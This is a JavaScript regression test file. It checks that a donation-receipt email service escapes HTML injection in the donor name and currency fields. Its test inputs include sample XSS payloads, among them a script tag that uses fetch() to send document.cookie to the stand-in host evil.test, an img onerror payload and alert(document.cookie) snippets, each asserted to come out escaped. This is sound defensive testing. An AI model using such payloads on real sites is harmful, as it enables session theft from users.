// Security regression coverage: HTML injection fix in the donation-receipt
// email (receipt.service.js). Same two-layer approach as the earlier
// forms-notification fix (forms.notificationEscaping.test.js):
//
// 1. buildReceiptEmailHtml() tested directly with realistic malicious
//    donor-name/currency payloads -- this is the exact function
//    sendDonationReceiptIfNeeded calls to build the email body, so this IS
//    the actual production HTML-generation path, not a reimplementation.
// 2. sendDonationReceiptIfNeeded exercised end to end via a throwaway
//    in-memory MongoDB (mongodb-memory-server, same pattern used throughout
//    this test suite) -- confirms the fix doesn't change the stored
//    donation, the idempotency claim boundary, or delivery-result handling.
//    No SMTP is configured in this test run, so sendMail() takes its
//    existing, pre-proven "log instead of sending" path -- no real email is
//    ever sent. No Razorpay call is made anywhere in this file: donations
//    are created directly in the disposable DB already at `paid_verified`,
//    never through the real order/verify/webhook flow.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { MongoMemoryServer } from 'mongodb-memory-server';
import mongoose from 'mongoose';

let mem;
let buildReceiptEmailHtml;
let sendDonationReceiptIfNeeded;
let DonationModel;

before(async () => {
  mem = await MongoMemoryServer.create();
  await mongoose.connect(mem.getUri());
  ({ buildReceiptEmailHtml, sendDonationReceiptIfNeeded } = await import('./receipt.service.js'));
  ({ DonationModel } = await import('./donation.model.js'));
});

after(async () => {
  await mongoose.disconnect();
  await mem.stop();
});

const BASE_FIELDS = { currency: 'INR', amount: 501, schemeSlug: 'bala-gurukulam', receiptNo: 'RCPT-ABCD1234-XYZ' };

// --- buildReceiptEmailHtml: the actual email-generation code path ---

test('a normal donor name renders correctly', () => {
  const html = buildReceiptEmailHtml({ donorName: 'Ananya Sharma', ...BASE_FIELDS });
  assert.match(html, /Namaste Ananya Sharma,/);
});

test('an HTML tag in the donor name is escaped, not rendered as markup', () => {
  const html = buildReceiptEmailHtml({ donorName: '<b>Important Donor</b>', ...BASE_FIELDS });
  assert.doesNotMatch(html, /<b>Important Donor<\/b>/);
  assert.match(html, /&lt;b&gt;Important Donor&lt;\/b&gt;/);
});

test('script-like markup in the donor name is displayed as inert text', () => {
  const html = buildReceiptEmailHtml({ donorName: '<script>fetch("https://evil.test/steal?c="+document.cookie)</script>', ...BASE_FIELDS });
  assert.doesNotMatch(html, /<script>/);
  assert.match(html, /&lt;script&gt;/);
});

test('ampersands and quotation marks in the donor name are escaped', () => {
  const html = buildReceiptEmailHtml({ donorName: `Raj & "Sons" Trust`, ...BASE_FIELDS });
  assert.match(html, /Raj &amp; &quot;Sons&quot; Trust/);
});

test('a malicious currency value is escaped too (the second confirmed user-controlled field)', () => {
  const html = buildReceiptEmailHtml({ donorName: 'A', ...BASE_FIELDS, currency: '<img src=x onerror=alert(1)>' });
  assert.doesNotMatch(html, /<img src=x onerror=/);
  assert.match(html, /&lt;img src=x onerror=alert\(1\)&gt;/);
});

test('Sanskrit/Unicode donor names remain intact', () => {
  const html = buildReceiptEmailHtml({ donorName: 'योगाचार्य श्री रामानुजाचार्य', ...BASE_FIELDS });
  assert.match(html, /योगाचार्य श्री रामानुजाचार्य/);

  const html2 = buildReceiptEmailHtml({ donorName: 'Gītā Devi', ...BASE_FIELDS });
  assert.match(html2, /Gītā Devi/);
});

test('an empty or missing donor name is handled safely, matching the prior fallback behavior', () => {
  assert.match(buildReceiptEmailHtml({ donorName: '', ...BASE_FIELDS }), /Namaste ,/);
  assert.match(buildReceiptEmailHtml({ donorName: undefined, ...BASE_FIELDS }), /Namaste ,/);
  assert.match(buildReceiptEmailHtml({ donorName: null, ...BASE_FIELDS }), /Namaste ,/);
});

test('amount, schemeSlug and receiptNo are preserved exactly, unaffected by the escaping fix', () => {
  const html = buildReceiptEmailHtml({ donorName: 'Normal Donor', ...BASE_FIELDS });
  assert.match(html, /donation of INR 501 to bala-gurukulam/);
  assert.match(html, /Receipt number: <strong>RCPT-ABCD1234-XYZ<\/strong>/);
});

test('building the receipt HTML does not mutate the fields object passed in', () => {
  const fields = { donorName: '<script>bad()</script>', ...BASE_FIELDS };
  const beforeSnapshot = JSON.parse(JSON.stringify(fields));
  buildReceiptEmailHtml(fields);
  assert.deepEqual(fields, beforeSnapshot, 'the fields object must be byte-identical afterward');
});

// --- sendDonationReceiptIfNeeded end to end ---

async function createPaidVerifiedDonation(overrides = {}) {
  return DonationModel.create({
    donor: { name: 'Attack Vector', email: 'attacker@example.test' },
    schemeId: new mongoose.Types.ObjectId(),
    schemeSlug: 'bala-gurukulam',
    amount: 501,
    currency: 'INR',
    razorpayOrderId: `order_${new mongoose.Types.ObjectId().toString()}`,
    razorpayPaymentId: `pay_${new mongoose.Types.ObjectId().toString()}`,
    status: 'paid_verified',
    ...overrides,
  });
}

test('a donation with a malicious donor name is processed (attempted) without being mutated in MongoDB', async () => {
  const donation = await createPaidVerifiedDonation({ donor: { name: '<script>alert(document.cookie)</script>', email: 'attacker@example.test' } });

  const result = await sendDonationReceiptIfNeeded(donation._id.toString());
  assert.equal(result.attempted, true);

  const stored = await DonationModel.findById(donation._id).lean();
  assert.equal(
    stored.donor.name,
    '<script>alert(document.cookie)</script>',
    'the stored donation must keep the raw, unescaped original donor name -- only the receipt EMAIL is escaped'
  );
});

test('a donation missing a donor email is marked failed without attempting to send, unaffected by the fix', async () => {
  const donation = await createPaidVerifiedDonation({ donor: { name: 'No Email Donor', email: undefined } });
  const result = await sendDonationReceiptIfNeeded(donation._id.toString());
  assert.equal(result.attempted, true);
  assert.equal(result.sent, false);

  const stored = await DonationModel.findById(donation._id).lean();
  assert.equal(stored.receipt.status, 'failed');
});

test('idempotency: a donation whose receipt is already "sent" is never re-attempted', async () => {
  const donation = await createPaidVerifiedDonation({ receipt: { status: 'sent', receiptNo: 'RCPT-ALREADY-SENT', sentAt: new Date() } });
  const result = await sendDonationReceiptIfNeeded(donation._id.toString());
  assert.equal(result.attempted, false, 'an already-sent receipt must not be re-sent');
});

test('idempotency: a donation whose receipt is already "processing" (a concurrent in-flight attempt) is not double-claimed', async () => {
  const donation = await createPaidVerifiedDonation({ receipt: { status: 'processing', claimedAt: new Date() } });
  const result = await sendDonationReceiptIfNeeded(donation._id.toString());
  assert.equal(result.attempted, false, 'a receipt already being processed by another caller must not be claimed again');
});

test('a donation not yet paid_verified is never attempted, unaffected by the fix', async () => {
  const donation = await createPaidVerifiedDonation({ status: 'order_created' });
  const result = await sendDonationReceiptIfNeeded(donation._id.toString());
  assert.equal(result.attempted, false);
});
